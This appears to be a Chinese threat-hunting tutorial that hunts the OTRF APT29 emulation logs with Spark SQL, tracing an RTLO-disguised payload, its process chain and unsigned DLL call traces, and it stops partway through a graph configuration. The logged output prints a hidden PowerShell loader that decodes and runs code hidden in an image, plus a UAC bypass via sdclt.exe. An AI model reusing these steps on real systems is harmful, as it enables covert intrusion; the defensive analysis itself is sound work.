# 关于APT29

APT29 是被归咎于俄罗斯外国情报局 (SVR) 的威胁组织。他们至少从 2008 年开始运作，通常针对欧洲和北约成员国的政府网络、研究机构和智囊团。
据报道，APT29 从 2015 年夏天开始危害民主党全国委员会。

2021 年 4 月，美国和英国政府将 SolarWinds 供应链入侵网络操作归咎于 SVR； 公开声明包括对 APT29、Cozy Bear 和 The
Dukes 的引用。这场运动的受害者包括北美、欧洲、亚洲和中东的政府、咨询、技术、电信和其他组织。 行业报告将参与此次活动的参与者称为
UNC2452、NOBELIUM、StellarParticle 和 Dark Halo。

参考：[APT29, NobleBaron, Dark Halo, StellarParticle, NOBELIUM, UNC2452, YTTRIUM,
The Dukes, Cozy Bear, CozyDuke, Group G0016 | MITRE
ATT&CK®](https://attack.mitre.org/groups/G0016/)

# 0x00 日志数据集

https://github.com/OTRF/Security-Datasets/tree/master/datasets/compound/apt29

## 导入数据

下载数据：https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/compound/apt29/day1/apt29_evals_day1_manual.zip

然后解压得到 json 格式的日志文件。

    
    
    from pyspark.sql import SparkSession
    
    df_day1_host = spark.read.json('apt29_evals_day1_manual_2020-05-01225525.json')
    df_day1_host.createTempView('apt29Host')
    

## 数据总览

    
    
    spark.sql(
        """
        select
            Channel
            ,SourceName
            ,EventID
            ,Category
            ,min(EventTime) EventTimeFrom
            ,max(EventTime) EventTimeTo
            ,count(1) cnt
        from
            apt29Host
        group by
            Channel
            ,SourceName
            ,EventID
            ,Category
        order by
            Channel
            ,SourceName
            ,EventID
            ,Category
        """
    ).toPandas()
    

Channel| SourceName| EventID| Category| EventTimeFrom| EventTimeTo| cnt  
---|---|---|---|---|---|---  
Microsoft-Windows-Bits-Client/Operational| Microsoft-Windows-Bits-Client| 306|
null| 2020-05-01 23:19:50| 2020-05-01 23:19:50| 1  
Microsoft-Windows-PowerShell/Operational| Microsoft-Windows-PowerShell| 4100|
Executing Pipeline| 2020-05-01 23:04:57| 2020-05-01 23:04:57| 45  
Microsoft-Windows-PowerShell/Operational| Microsoft-Windows-PowerShell| 4101|
null| 2020-05-01 23:08:25| 2020-05-01 23:08:35| 2  
Microsoft-Windows-PowerShell/Operational| Microsoft-Windows-PowerShell| 4103|
Executing Pipeline| 2020-05-01 22:56:15| 2020-05-01 23:21:30| 5080  
Microsoft-Windows-PowerShell/Operational| Microsoft-Windows-PowerShell| 4104|
Execute a Remote Command| 2020-05-01 22:56:15| 2020-05-01 23:21:29| 414  
Microsoft-Windows-PowerShell/Operational| Microsoft-Windows-PowerShell| 8193|
Connect| 2020-05-01 23:05:56| 2020-05-01 23:09:23| 3  
Microsoft-Windows-PowerShell/Operational| Microsoft-Windows-PowerShell| 8194|
Connect| 2020-05-01 23:05:56| 2020-05-01 23:09:23| 3  
Microsoft-Windows-PowerShell/Operational| Microsoft-Windows-PowerShell| 8195|
Connect| 2020-05-01 23:05:56| 2020-05-01 23:09:23| 3  
Microsoft-Windows-PowerShell/Operational| Microsoft-Windows-PowerShell| 8196|
null| 2020-05-01 23:05:58| 2020-05-01 23:09:29| 46  
Microsoft-Windows-PowerShell/Operational| Microsoft-Windows-PowerShell| 8197|
Connect| 2020-05-01 23:05:56| 2020-05-01 23:09:29| 12  
Microsoft-Windows-PowerShell/Operational| Microsoft-Windows-PowerShell| 12039|
null| 2020-05-01 23:05:58| 2020-05-01 23:09:29| 46  
Microsoft-Windows-PowerShell/Operational| Microsoft-Windows-PowerShell| 40961|
PowerShell Console Startup| 2020-05-01 22:56:14| 2020-05-01 23:21:29| 13  
Microsoft-Windows-PowerShell/Operational| Microsoft-Windows-PowerShell| 40962|
PowerShell Console Startup| 2020-05-01 22:56:15| 2020-05-01 23:21:29| 11  
Microsoft-Windows-PowerShell/Operational| Microsoft-Windows-PowerShell| 53504|
PowerShell Named Pipe IPC| 2020-05-01 22:56:15| 2020-05-01 23:21:29| 16  
Microsoft-Windows-Sysmon/Operational| Microsoft-Windows-Sysmon| 1| null|
2020-05-01 22:55:56| 2020-05-01 23:26:11| 447  
Microsoft-Windows-Sysmon/Operational| Microsoft-Windows-Sysmon| 2| null|
2020-05-01 22:58:44| 2020-05-01 23:27:11| 209  
Microsoft-Windows-Sysmon/Operational| Microsoft-Windows-Sysmon| 3| null|
2020-05-01 22:55:26| 2020-05-01 23:27:55| 1229  
Microsoft-Windows-Sysmon/Operational| Microsoft-Windows-Sysmon| 4| null|
2020-05-01 23:19:18| 2020-05-01 23:19:18| 1  
Microsoft-Windows-Sysmon/Operational| Microsoft-Windows-Sysmon| 5| null|
2020-05-01 22:55:28| 2020-05-01 23:28:09| 401  
Microsoft-Windows-Sysmon/Operational| Microsoft-Windows-Sysmon| 7| null|
2020-05-01 22:55:32| 2020-05-01 23:28:12| 20259  
Microsoft-Windows-Sysmon/Operational| Microsoft-Windows-Sysmon| 8| null|
2020-05-01 23:05:16| 2020-05-01 23:20:44| 95  
Microsoft-Windows-Sysmon/Operational| Microsoft-Windows-Sysmon| 9| null|
2020-05-01 22:56:47| 2020-05-01 23:26:48| 652  
Microsoft-Windows-Sysmon/Operational| Microsoft-Windows-Sysmon| 10| null|
2020-05-01 22:55:23| 2020-05-01 23:28:17| 39283  
Microsoft-Windows-Sysmon/Operational| Microsoft-Windows-Sysmon| 11| null|
2020-05-01 22:55:28| 2020-05-01 23:28:11| 1649  
Microsoft-Windows-Sysmon/Operational| Microsoft-Windows-Sysmon| 12| null|
2020-05-01 22:55:30| 2020-05-01 23:28:00| 61151  
  
# 0x01 进程日志

这里基于 Sysmon 的进程创建、进程退出、映像加载、进程间访问等日志（EventID：1、5、7、10）进行分析。

## 异常进程

特征：

使用 unicode 从右到左覆盖 (RTLO) 字符，来混淆 payload 文件 rcs.3aka3.doc（比如：â€®cod.3aka.scr ）

检测：

    
    
    df = spark.sql(
        """
        select
            a.UtcTime process_start_time
            ,b.UtcTime process_end_time
            ,a.Severity
            ,a.Domain
            ,a.Hostname
            ,a.User
            ,a.AccountName
            ,a.AccountType
            ,a.CurrentDirectory
            ,a.ParentProcessId
            ,a.ParentImage
            ,a.ParentCommandLine
            ,a.ProcessGuid
            ,a.ProcessId
            ,a.Image process_path
            ,a.OriginalFileName process_name
            ,a.CommandLine
            ,a.Description
            ,a.Company
            ,a.Product
        from
        (
            select
                *
            from
                apt29Host
            where
                Channel = 'Microsoft-Windows-Sysmon/Operational'
                and EventID = '1'
                -- AND LOWER(ParentImage) LIKE "%explorer.exe"
                -- AND LOWER(Image) LIKE "%3aka3%"
    
                AND LOWER(Image) RLIKE '.*â€Ž|â€|â€ª|â€«|â€¬|â€|â€®.*'
        ) a
        left join
        (
            select
                *
            from
                apt29Host
            where
                Channel = 'Microsoft-Windows-Sysmon/Operational'
                and EventID = '5'
        ) b
        on
            a.Hostname = b.Hostname
            and a.ProcessGuid = b.ProcessGuid
        """
    )
    df.toPandas()
    

process_start_time| process_end_time| Severity| Domain| Hostname| User|
AccountName| AccountType| CurrentDirectory| ParentProcessId| ParentImage|
ParentCommandLine| ProcessGuid| ProcessId| process_path| process_name|
CommandLine| Description| Company| Product  
---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---  
2020-05-02 02:55:56.157| 2020-05-02 03:01:27.277| INFO| NT AUTHORITY|
SCRANTON.dmevals.local| DMEVALS\pbeesly| SYSTEM| User| C:\ProgramData\victim\|
4440| C:\Windows\explorer.exe| C:\windows\Explorer.EXE|
{47ab858c-e13c-5eac-a903-000000000400}| 8524|
C:\ProgramData\victim\â€®cod.3aka3.scr| -|
"C:\ProgramData\victim\â€®cod.3aka3.scr" /S| -| -| -  
  
## 进程调用链分析

将某个进程（通常是恶意进程）作为起点，根据进程创建日志中的 ParentProcess* 和 Process* 信息，递归分析其创建的所有子进程。

    
    
    # 递归查找所有子进程
    def __generate_process_chain_list(process_list_df, root_process_s, depth):
    
        # 终止条件
        if depth <= 0:
            return [[root_process_s]]
    
        # 获取子进程列表
        child_process_list_df = process_list_df[process_list_df["ParentProcessGuid"] == root_process_s["ProcessGuid"]]
        if child_process_list_df.index.size == 0:
            return [[root_process_s]]
    
        # 递归查找
        process_chain_list = []
        for i in range(child_process_list_df.index.size):
            child_process_s = child_process_list_df.iloc[i]
            child_process_chain_list = __generate_process_chain_list(process_list_df, child_process_s, depth - 1)
            for child_process_chain in child_process_chain_list:
                process_chain = [root_process_s]
                process_chain.extend(child_process_chain)
                process_chain_list.append(process_chain)
        return process_chain_list
    
    
    def generate_process_chain_list(process_list_df, root_process_guid, depth=3):
        """根据进程创建日志，生成目标进程的调用链列表
    
        :param process_list_df: 进程创建日志的 pd.Dataframe 对象
        :param root_process_guid: 目标进程的 GUID 字符串
        :param depth: 递归深度，即往下再查找几层
    
        :return: 进程调用链的列表，其中，每条进程调用链也是一个列表，子列表中的
            每个元素是表示进程信息的 pd.Series 对象，例如：
    
            [[root_process_s, child_process_1_s, child_child_process_1_s],
             [root_process_s, child_process_1_s, child_child_process_2_s],
             [root_process_s, child_process_2_s]]
    
            如果目标进程没有创建子进程，则返回：
            [[root_process_s]]
    
            如果目标进程不存在，则返回：
            []
        """
        root_process_df = process_list_df[process_list_df["ProcessGuid"] == root_process_guid]
        if root_process_df.index.size == 0:
            return []
    
        root_process_s = root_process_df.iloc[0]
        return __generate_process_chain_list(process_list_df, root_process_s, depth)
    
    
    def generate_process_chain_guid_list(process_chain_list):
        """生成调用链中所有进程的 GUID 的列表
    
        :param process_chain_list: 进程调用链列表（调用 generate_process_chain_list 方法获取）
    
        :return: 进程的 GUID 的列表
        """
        process_chain_guid_list = []
        for process_chain in process_chain_list:
            for process_s in process_chain:
                process_guid = process_s["ProcessGuid"]
                if process_guid not in process_chain_guid_list:
                    process_chain_guid_list.append(process_guid)
        return process_chain_guid_list
    
    
    def generate_process_nodes_and_edges(process_chain_list):
        """生成用于 Echarts 力导向图配置 option 里的 nodes、edges 数据
    
        :param process_chain_list: 进程调用链列表（调用 generate_process_chain_list 方法获取）
    
        :return: nodes 和 edges 数据的二元组
        """
        def __get_node_name(process_s):
            return process_s["ProcessId"] + "|" + process_s["process_path"]
    
        def __get_node_value(process_s):
            return process_s["CommandLine"]
    
        if not process_chain_list:
            return [], []
    
        root_process_s = process_chain_list[0][0]
        node_list = []
        edge_list = []
        for process_chain in process_chain_list:
            for i in range(len(process_chain) - 1):
                this_name = __get_node_name(process_chain[i])
                this_value = __get_node_value(process_chain[i])
                next_name = __get_node_name(process_chain[i + 1])
                node = {'name': this_name, 'value': this_value}
                edge = {'source': this_name, 'target': next_name}
                if this_name == __get_node_name(root_process_s):
                    node['itemStyle'] = {'color': 'red'}
                if node not in node_list:
                    node_list.append(node)
                if edge not in edge_list:
                    edge_list.append(edge)
            this_name = __get_node_name(process_chain[len(process_chain) - 1])
            this_value = __get_node_value(process_chain[len(process_chain) - 1])
            node = {'name': this_name, 'value': this_value}
            if node not in node_list:
                node_list.append(node)
    
        return node_list, edge_list
    
    # 获取进程创建日志的 Dataframe
    process_list_df = spark.sql(
        """
        select
            a.UtcTime process_start_time
            ,b.UtcTime process_end_time
            ,a.Severity
            ,a.Domain
            ,a.Hostname
            ,a.User
            ,a.AccountName
            ,a.AccountType
            ,a.CurrentDirectory
            ,a.ParentProcessGuid
            ,a.ParentProcessId
            ,a.ParentImage
            ,a.ParentCommandLine
            ,a.ProcessGuid
            ,a.ProcessId
            ,a.Image process_path
            ,a.OriginalFileName process_name
            ,a.CommandLine
            ,a.Description
            ,a.Company
            ,a.Product
        from
        (
            select
                *
            from
                apt29Host
            where
                Channel = 'Microsoft-Windows-Sysmon/Operational'
                and EventID = '1'
        ) a
        left join
        (
            select
                *
            from
                apt29Host
            where
                Channel = 'Microsoft-Windows-Sysmon/Operational'
                and EventID = '5'
        ) b
        on
            a.Hostname = b.Hostname
            and a.ProcessGuid = b.ProcessGuid
        """
    ).toPandas()
    
    # 获取恶意进程的调用链
    process_chain_list = generate_process_chain_list(process_list_df, '{47ab858c-e13c-5eac-a903-000000000400}', 4)
    
    # 输出调用链中所有进程的详情
    process_chain_guid_list = generate_process_chain_guid_list(process_chain_list)
    process_list_df[process_list_df.apply(lambda process_s : process_s['ProcessGuid'] in process_chain_guid_list, axis=1)].reset_index(drop=True)
    
    # 输出 nodes、edges 参数配置
    process_node_list, process_edge_list = generate_process_nodes_and_edges(process_chain_list)
    process_node_list
    process_edge_list
    

调用链中所有进程的详情：

process_start_time| process_end_time| Severity| Domain| Hostname| User|
AccountName| AccountType| CurrentDirectory| ParentProcessGuid|
ParentProcessId| ParentImage| ParentCommandLine| ProcessGuid| ProcessId|
process_path| process_name| CommandLine| Description| Company| Product  
---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---  
2020-05-02 02:55:56.157| 2020-05-02 03:01:27.277| INFO| NT AUTHORITY|
SCRANTON.dmevals.local| DMEVALS\pbeesly| SYSTEM| User| C:\ProgramData\victim\|
{47ab858c-dac4-5eac-f202-000000000400}| 4440| C:\Windows\explorer.exe|
C:\windows\Explorer.EXE| {47ab858c-e13c-5eac-a903-000000000400}| 8524|
C:\ProgramData\victim\â€®cod.3aka3.scr| -|
"C:\ProgramData\victim\â€®cod.3aka3.scr" /S| -| -| -  
2020-05-02 02:56:04.494| 2020-05-02 02:56:26.523| INFO| NT AUTHORITY|
SCRANTON.dmevals.local| DMEVALS\pbeesly| SYSTEM| User| C:\ProgramData\victim\|
{47ab858c-e13c-5eac-a903-000000000400}| 8524|
C:\ProgramData\victim\â€®cod.3aka3.scr|
"C:\ProgramData\victim\â€®cod.3aka3.scr" /S| {47ab858c-e144-5eac-aa03-000000000400}| 5156| C:\Windows\System32\conhost.exe| CONHOST.EXE|
\?\C:\windows\system32\conhost.exe --headless --width 80 --height 25 --signal
0x54c --server 0x540| Console Window Host| Microsoft Corporation| Microsoft®
Windows® Operating System  
2020-05-02 02:56:04.510| 2020-05-02 02:56:26.523| INFO| NT AUTHORITY|
SCRANTON.dmevals.local| DMEVALS\pbeesly| SYSTEM| User| C:\ProgramData\victim\|
{47ab858c-e13c-5eac-a903-000000000400}| 8524|
C:\ProgramData\victim\â€®cod.3aka3.scr|
"C:\ProgramData\victim\â€®cod.3aka3.scr" /S| {47ab858c-e144-5eac-ab03-000000000400}| 2772| C:\Windows\System32\cmd.exe| Cmd.Exe|
"C:\windows\system32\cmd.exe"| Windows Command Processor| Microsoft
Corporation| Microsoft® Windows® Operating System  
2020-05-02 02:56:14.894| 2020-05-02 02:56:25.218| INFO| NT AUTHORITY|
SCRANTON.dmevals.local| DMEVALS\pbeesly| SYSTEM| User| C:\ProgramData\victim\|
{47ab858c-e144-5eac-ab03-000000000400}| 2772| C:\Windows\System32\cmd.exe|
"C:\windows\system32\cmd.exe"| {47ab858c-e14e-5eac-ac03-000000000400}| 5944|
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe| PowerShell.EXE|
powershell| Windows PowerShell| Microsoft Corporation| Microsoft® Windows®
Operating System  
2020-05-02 02:57:12.374| 2020-05-02 02:59:21.255| INFO| NT AUTHORITY|
SCRANTON.dmevals.local| DMEVALS\pbeesly| SYSTEM| User| C:\ProgramData\victim\|
{47ab858c-e13c-5eac-a903-000000000400}| 8524|
C:\ProgramData\victim\â€®cod.3aka3.scr|
"C:\ProgramData\victim\â€®cod.3aka3.scr" /S| {47ab858c-e188-5eac-af03-000000000400}| 3152| C:\Windows\System32\conhost.exe| CONHOST.EXE|
\?\C:\windows\system32\conhost.exe --headless --width 80 --height 25 --signal
0x474 --server 0x50c| Console Window Host| Microsoft Corporation| Microsoft®
Windows® Operating System  
2020-05-02 02:57:12.376| 2020-05-02 02:59:21.255| INFO| NT AUTHORITY|
SCRANTON.dmevals.local| DMEVALS\pbeesly| SYSTEM| User| C:\ProgramData\victim\|
{47ab858c-e13c-5eac-a903-000000000400}| 8524|
C:\ProgramData\victim\â€®cod.3aka3.scr|
"C:\ProgramData\victim\â€®cod.3aka3.scr" /S|
{47ab858c-e188-5eac-b003-000000000400}| 3480| C:\Windows\System32\cmd.exe|
Cmd.Exe| "C:\windows\system32\cmd.exe"| Windows Command Processor| Microsoft
Corporation| Microsoft® Windows® Operating System  
2020-05-02 02:57:15.946| 2020-05-02 02:58:33.489| INFO| NT AUTHORITY|
SCRANTON.dmevals.local| DMEVALS\pbeesly| SYSTEM| User| C:\ProgramData\victim\|
{47ab858c-e188-5eac-b003-000000000400}| 3480| C:\Windows\System32\cmd.exe|
"C:\windows\system32\cmd.exe"| {47ab858c-e18b-5eac-b103-000000000400}| 6868|
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe| PowerShell.EXE|
powershell| Windows PowerShell| Microsoft Corporation| Microsoft® Windows®
Operating System  
2020-05-02 02:58:42.401| 2020-05-02 02:58:42.470| INFO| NT AUTHORITY|
SCRANTON.dmevals.local| DMEVALS\pbeesly| SYSTEM| User| C:\ProgramData\victim\|
{47ab858c-e188-5eac-b003-000000000400}| 3480| C:\Windows\System32\cmd.exe|
"C:\windows\system32\cmd.exe"| {47ab858c-e1e2-5eac-b203-000000000400}| 5400|
C:\Windows\System32\sdclt.exe| sdclt.exe| C:\windows\system32\sdclt.exe|
Microsoft® Windows Backup| Microsoft Corporation| Microsoft® Windows®
Operating System  
2020-05-02 02:58:42.855| 2020-05-02 02:58:42.858| INFO| NT AUTHORITY|
SCRANTON.dmevals.local| DMEVALS\pbeesly| SYSTEM| User| C:\ProgramData\victim\|
{47ab858c-e188-5eac-b003-000000000400}| 3480| C:\Windows\System32\cmd.exe|
"C:\windows\system32\cmd.exe"| {47ab858c-e1e2-5eac-b303-000000000400}| 9096|
C:\Windows\System32\sdclt.exe| sdclt.exe| "C:\windows\system32\sdclt.exe"|
Microsoft® Windows Backup| Microsoft Corporation| Microsoft® Windows®
Operating System  
2020-05-02 02:58:43.008| 2020-05-02 02:58:43.233| INFO| NT AUTHORITY|
SCRANTON.dmevals.local| DMEVALS\pbeesly| SYSTEM| User| C:\windows\system32\|
{47ab858c-e188-5eac-b003-000000000400}| 3480| C:\Windows\System32\cmd.exe|
"C:\windows\system32\cmd.exe"| {47ab858c-e1e3-5eac-b403-000000000400}| 6492|
C:\Windows\System32\sdclt.exe| sdclt.exe| "C:\windows\system32\sdclt.exe"|
Microsoft® Windows Backup| Microsoft Corporation| Microsoft® Windows®
Operating System  
2020-05-02 02:58:43.212| 2020-05-02 02:58:44.373| INFO| NT AUTHORITY|
SCRANTON.dmevals.local| DMEVALS\pbeesly| SYSTEM| User| C:\windows\system32\|
{47ab858c-e1e3-5eac-b403-000000000400}| 6492| C:\Windows\System32\sdclt.exe|
"C:\windows\system32\sdclt.exe"| {47ab858c-e1e3-5eac-b603-000000000400}| 4892|
C:\Windows\System32\control.exe| CONTROL.EXE|
"C:\Windows\System32\control.exe" /name Microsoft.BackupAndRestoreCenter|
Windows Control Panel| Microsoft Corporation| Microsoft® Windows® Operating
System  
2020-05-02 02:58:44.325| 2020-05-02 03:18:32.641| INFO| NT AUTHORITY|
SCRANTON.dmevals.local| DMEVALS\pbeesly| SYSTEM| User| C:\windows\system32\|
{47ab858c-e1e3-5eac-b603-000000000400}| 4892| C:\Windows\System32\control.exe|
"C:\Windows\System32\control.exe" /name Microsoft.BackupAndRestoreCenter|
{47ab858c-e1e4-5eac-b803-000000000400}| 2976|
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe| PowerShell.EXE|
"PowerShell.exe" -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a
System.Drawing.Bitmap('C:\Users\pbeesly\Downloads\monkey.png');$o=a Byte[]
4480;for($i=0; $i -le 6; $i++){foreach($x
in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))"|
Windows PowerShell| Microsoft Corporation| Microsoft® Windows® Operating
System  
2020-05-02 02:59:04.124| 2020-05-02 02:59:19.802| INFO| NT AUTHORITY|
SCRANTON.dmevals.local| DMEVALS\pbeesly| SYSTEM| User| C:\ProgramData\victim\|
{47ab858c-e188-5eac-b003-000000000400}| 3480| C:\Windows\System32\cmd.exe|
"C:\windows\system32\cmd.exe"| {47ab858c-e1f8-5eac-bc03-000000000400}| 3832|
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe| PowerShell.EXE|
powershell| Windows PowerShell| Microsoft Corporation| Microsoft® Windows®
Operating System  
  
Echarts 可视化分析：  
[Examples - Apache
ECharts](https://echarts.apache.org/examples/zh/editor.html?c=graph-simple)  
![image](https://image.3001.net/images/20220216/1645002277_620cbe259fb3fc581b8e9.png!small)

从图中可以清楚的看到，

payload 先启动了 cmd.exe，然后启动 powershell 执行脚本，并进而启动了 sdclt.exe 和
control.exe（尝试绕过UAC）

## 映像加载链分析

根据 image load 日志（EventID：7）的 SignatureStatus
信息（DLL签名状态），筛选出签名无效的DLL（当然，并非所有签名无效的 DLL 都是“恶意”的，还需进一步判断和加白），

然后，结合 process access 日志（EventID：10）的 CallTrace
信息（DLL调用链），将存在“恶意”DLL的调用链筛选出来，可视化分析其调用关系。

    
    
    """
      process image load (focus on unbelievable)
    
    """
    image_unbelievable_df = spark.sql(
        """
        select
            b.UtcTime process_start_time
            ,a.UtcTime image_load_time
            ,a.Severity
            ,a.Domain
            ,a.Hostname
            ,a.User
            ,a.AccountName
            ,a.AccountType
            ,a.ProcessId
            ,a.Image process_path
            ,a.ImageLoaded image_path
            ,a.OriginalFileName image_name
            ,a.Description
            ,a.Company
            ,a.Product
            ,a.Signed
            ,a.Signature
            ,a.SignatureStatus
        from
        (
            select
                *
            from
                apt29Host
            where
                Channel = 'Microsoft-Windows-Sysmon/Operational'
                and EventID = '7'
                and SignatureStatus <> 'Valid'
        ) a
        left join
        (
            select
                *
            from
                apt29Host
            where
                Channel = 'Microsoft-Windows-Sysmon/Operational'
                and EventID = '1'
        ) b
        on
            a.Hostname = b.Hostname
            and a.ProcessGuid = b.ProcessGuid
        """
    ).toPandas()
    image_unbelievable_df
    
    
    """
      process access (focus on unbelievable calltrace)
    
    """
    process_access_unbelievable_df = spark.sql(
        """
        select
            b.UtcTime process_start_time
            ,a.UtcTime process_access_time
            ,a.Severity
            ,a.Domain
            ,a.Hostname
            ,a.User
            ,a.AccountName
            ,a.AccountType
            ,a.SourceProcessId process_id
            ,a.SourceThreadId thread_id
            ,a.SourceImage process_path
            ,a.TargetProcessId target_process_id
            ,a.TargetImage target_process_path
            ,a.GrantedAccess
            ,a.CallTrace
        from
        (
            select
                distinct a.*
            from
            (
                select
                    *
                from
                    apt29Host
                where
                    Channel = 'Microsoft-Windows-Sysmon/Operational'
                    and EventID = '10'
            ) a
            join
            (
                select
                    lower(ImageLoaded) image_path
                from
                    apt29Host
                where
                    Channel = 'Microsoft-Windows-Sysmon/Operational'
                    and EventID = '7'
                    and SignatureStatus <> 'Valid'
                group by
                    lower(ImageLoaded)
            ) b
            on
                1 = 1
            where
                instr(lower(a.CallTrace), b.image_path) > 0
        ) a
        left join
        (
            select
                *
            from
                apt29Host
            where
                Channel = 'Microsoft-Windows-Sysmon/Operational'
                and EventID = '1'
        ) b
        on
            a.Hostname = b.Hostname
            and a.SourceProcessGUID = b.ProcessGuid
        """
    ).toPandas()
    process_access_unbelievable_df
    
    
    def __generate_call_trace_nodes_and_edges(call_trace_list=[], unbelievable_dll_list=[]):
    
        dll_node_set = set()
        dll_edge_set = set()
    
        for call_trace in call_trace_list:
            call_trace_spilt_list = call_trace.split('|')
            for i in range(0, len(call_trace_spilt_list) - 1):
                dll_path = call_trace_spilt_list[i].split('+')[0].lower()
                dll_node_set.add(dll_path)
                dll_edge_set.add((dll_path, call_trace_spilt_list[i + 1].split('+')[0].lower()))
            dll_node_set.add(call_trace_spilt_list[len(call_trace_spilt_list) - 1].split('+')[0].lower())
    
        unbelievable_dll_set = set()
    
        for unbelievable_dll in unbelievable_dll_list:
            unbelievable_dll_set.add(unbelievable_dll.lower())
    
        node_list = []
        edge_list = []
    
        for dll_node in dll_node_set:
            if dll_node.lower() in unbelievable_dll_set:
                node_list.append({'name': dll_node, 'itemStyle': {'color': 'red'}, 'label': {'show': True}})
            elif dll_node.lower().startswith("unknown("):
                node_list.append({'name': dll_node, 'itemStyle': {'color': 'orange'}, 'label': {'show': True}})
            else:
                node_list.append({'name': dll_node})
    
        for source_dll_node, target_dll_node in dll_edge_set:
            edge_list.append({'source': source_dll_node, 'target': target_dll_node})
    
        return node_list, edge_list
    
    
    __generate_call_trace_nodes_and_edges(process_access_unbelievable_df["CallTrace"].values,
                                          image_unbelievable_df["image_path"].values)
    

Echarts 可视化分析：  
[Examples - Apache
ECharts](https://echarts.apache.org/examples/zh/editor.html?c=graph-simple)

    
    
    option = {
      title: {
        text: 'Basic Graph'
      },
      tooltip: {},
      series: [
        {
          type: 'graph',
          layout: 'force',
          draggable: true,
          zoom: 4.5,
          symbolSize: 10,
          roam: true,
          label: {
            fontSize: 16
          },
          edgeSymbol: ['circle', 'arrow'],
          edgeSymbolSize: [4, 10],
          edgeLabel: {
            fontSize: 20
          },
          nodes: [
            {'name': 'unknown(00007ffef22a01f3)',
             'itemStyle': {'color': 'orange'},
             'label': {'show': true}},
            {'name': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\mscorlib\\ce65e35ae3e57af12f3515300d00e518\\mscorlib.ni.dll'},
            {'name': 'c:\\windows\\system32\\ntdll.dll'},
            {'name': 'unknown(00007ffef1df3991)',
             'itemStyle': {'color': 'orange'},
             'label': {'show': true}},
            {'name': 'c:\\windows\\system32\\perfts.dll'},
            {'name': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system.manaa57fc8cc#\\fa56adb2347ed3a045d8f7471018af68\\system.management.automation.ni.dll',
             'itemStyle': {'color': 'red'},
             'label': {'show': true}},
            {'name': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\microsoft.pae3498d9#\\412e4e144df545096d7fbb3c9f354ca9\\microsoft.powershell.commands.management.ni.dll',
             'itemStyle': {'color': 'red'},
             'label': {'show': true}},
            {'name': 'unknown(00007ffa757ddc5b)',
             'itemStyle': {'color': 'orange'},
             'label': {'show': true}},
            {'name': 'unknown(00007ffa757cf7d1)',
             'itemStyle': {'color': 'orange'},
             'label': {'show': true}},
            {'name': 'c:\\windows\\microsoft.net\\framework64\\v4.0.30319\\mscoreei.dll'},
            {'name': 'c:\\users\\pbeesly\\appdata\\local\\temp\\_mei29522\\python27.dll',
             'itemStyle': {'color': 'red'},
             'label': {'show': true}},
            {'name': 'unknown(00007ffef1e15251)',
             'itemStyle': {'color': 'orange'},
             'label': {'show': true}},
            {'name': 'unknown(00007ffef1df5251)',
             'itemStyle': {'color': 'orange'},
             'label': {'show': true}},
            {'name': 'unknown(00007ffa86d327df)',
             'itemStyle': {'color': 'orange'},
             'label': {'show': true}},
            {'name': 'unknown(00007ffef1e0f7d1)',
             'itemStyle': {'color': 'orange'},
             'label': {'show': true}},
            {'name': 'unknown(00007ffa757e33f1)',
             'itemStyle': {'color': 'orange'},
             'label': {'show': true}},
            {'name': 'unknown(00007ffa758a1df6)',
             'itemStyle': {'color': 'orange'},
             'label': {'show': true}},
            {'name': 'unknown(00007ffa86ba4e6b)',
             'itemStyle': {'color': 'orange'},
             'label': {'show': true}},
            {'name': 'c:\\windows\\system32\\pla.dll',
             'itemStyle': {'color': 'red'},
             'label': {'show': true}},
            {'name': 'unknown(00007ffa512a3a51)',
             'itemStyle': {'color': 'orange'},
             'label': {'show': true}},
            {'name': 'c:\\windows\\temp\\python.exe',
             'itemStyle': {'color': 'red'},
             'label': {'show': true}},
            {'name': 'unknown(00007ffa757d7955)',
             'itemStyle': {'color': 'orange'},
             'label': {'show': true}},
            {'name': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\system\\9803982d7bc887e2745bff18a434ece1\\system.ni.dll',
             'itemStyle': {'color': 'red'},
             'label': {'show': true}},
            {'name': 'c:\\windows\\system32\\javamtsup.exe',
             'itemStyle': {'color': 'red'},
             'label': {'show': true}},
            {'name': 'unknown(00007ffa86c4c623)',
             'itemStyle': {'color': 'orange'},
             'label': {'show': true}},
            {'name': 'c:\\windows\\system32\\wtsapi32.dll'},
            {'name': 'unknown(00007ffa75a81b74)',
             'itemStyle': {'color': 'orange'},
             'label': {'show': true}},
            {'name': 'c:\\windows\\system32\\kernel32.dll'},
            {'name': 'c:\\windows\\assembly\\nativeimages_v4.0.30319_64\\microsoft.p521220ea#\\415482eab2cad62fc2e51e85d36c1ee7\\microsoft.powershell.commands.utility.ni.dll',
             'itemStyle': {'color': 'red'},
             'label': {'show': true}},
            {'name': 'unknown(00007ffa757d197c)',
             'itemStyle': {'color': 'orange'},
             'label': {'show': true}},
            {'name': 'c:\\windows\\system32\\sechost.dll'},
            {'name': 'unknown(00007ffa757f7045)',
             'itemStyle': {'color': 'orange'},
             'label': {'show': true}},
            {'name': 'c:\\windows\\system32\\mscoree.dll'},
            {'name': 'unknown(00007ffa51295251)',
             'itemStyle': {'color': 'orange'},
             'label': {'show': true}},
            {'name': 'unknown(00007ffa757f1615)',
             'itemStyle': {'color': 'orange'},
             'label': {'show': true}},
            {'name': 'unknown(00007ffef1d96620)',
             'itemStyle': {'color': 'orange'},
             'label': {'show': true}},
            {'name': 'c:\\windows\\microsoft.net\\framework64\\v4.0.30319\\corperfmonext.dll'},
            {'name': 'c:\\windows\\system32\\rpcrt4.dll'},
            {'name': 'c:\\windows\\system32\\winsta.dll'},
            {'name': 'unknown(00007ffa7580bb48)',
             'itemStyle': {'color': 'orange'},
             'label': {'show': true}},
